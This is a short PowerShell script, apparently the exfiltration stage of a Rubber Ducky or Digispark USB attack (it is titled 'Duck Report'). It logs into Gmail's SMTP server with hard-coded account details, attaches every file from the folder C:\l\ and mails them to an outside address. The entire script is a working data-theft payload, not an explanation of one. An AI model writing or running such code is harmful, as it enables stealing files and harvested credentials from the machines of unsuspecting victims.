$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('eskt869@gmail.com', 'YOURPASSWORD');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'nothing1533digisparkemailpasstesteextrarctiononlysecrethardbig@tuamaeaquelaursa.com'
$ReportEmail.To.Add('nothing1533digisparkemailpasstesteextrarctiononlysecrethardbig@tuamaeaquelaursa.com')
$ReportEmail.Subject = 'Duck Report'
$ReportEmail.Body = 'Attached is your duck report.... Quack' 
$files=Get-ChildItem "C:\l\"
Foreach($file in $files)
{
Write-Host “Attaching File :- ” $file
$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
$ReportEmail.Attachments.Add($attachment)
$SMTPInfo.Send($ReportEmail)
}
write-host "Mail Sent Successfully"
